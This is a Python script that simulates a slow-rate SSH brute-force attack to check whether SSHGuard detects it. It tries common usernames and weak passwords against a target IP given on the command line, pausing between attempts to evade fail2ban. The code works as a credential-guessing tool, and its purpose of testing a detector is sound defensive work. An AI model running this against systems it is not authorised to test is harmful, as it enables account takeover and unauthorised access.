#!/usr/bin/env python3
"""
SSHGuard Test Script
Simulates slow-rate SSH brute force attacks to test detection.
"""

import paramiko
import time
import sys
import threading
from datetime import datetime

def test_ssh_attack(target_ip, usernames, passwords, delay=5):
    """
    Simulate slow-rate SSH brute force attack.
    
    Args:
        target_ip: Target SSH server IP
        usernames: List of usernames to try
        passwords: List of passwords to try
        delay: Delay between attempts (seconds)
    """
    print(f"🎯 Starting slow-rate SSH attack simulation on {target_ip}")
    print(f"⏱️  Delay between attempts: {delay} seconds")
    print(f"👥 Testing {len(usernames)} usernames with {len(passwords)} passwords")
    print("-" * 60)
    
    attempt = 0
    
    for username in usernames:
        for password in passwords:
            attempt += 1
            timestamp = datetime.now().strftime("%H:%M:%S")
            
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                print(f"[{timestamp}] Attempt {attempt}: {username}:{password}")
                
                # This will likely fail (which is what we want for testing)
                ssh.connect(
                    target_ip, 
                    username=username, 
                    password=password, 
                    timeout=10,
                    banner_timeout=10
                )
                
                print(f"✅ SUCCESS: {username}:{password}")
                ssh.close()
                return True
                
            except paramiko.AuthenticationException:
                print(f"❌ Failed: {username}:{password}")
            except paramiko.SSHException as e:
                print(f"🚫 SSH Error: {e}")
            except Exception as e:
                print(f"⚠️  Connection Error: {e}")
            
            # Wait before next attempt (slow-rate attack)
            if attempt < len(usernames) * len(passwords):
                print(f"⏳ Waiting {delay} seconds...")
                time.sleep(delay)
    
    print(f"\n🏁 Attack simulation completed. {attempt} attempts made.")
    return False

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 test_sshguard.py <target_ip>")
        print("Example: python3 test_sshguard.py 192.168.1.100")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    
    # Common usernames and passwords for testing
    usernames = ['root', 'admin', 'user', 'test', 'ubuntu', 'debian']
    passwords = ['password', '123456', 'admin', 'root', 'test', 'qwerty']
    
    print("🔒 SSHGuard Attack Simulation")
    print("=" * 50)
    print("This script simulates a slow-rate brute force attack")
    print("that traditional fail2ban might miss but SSHGuard should detect.")
    print()
    
    try:
        test_ssh_attack(target_ip, usernames, passwords, delay=3)
    except KeyboardInterrupt:
        print("\n⏹️  Test interrupted by user")
    except Exception as e:
        print(f"💥 Error: {e}")

if __name__ == "__main__":
    main()
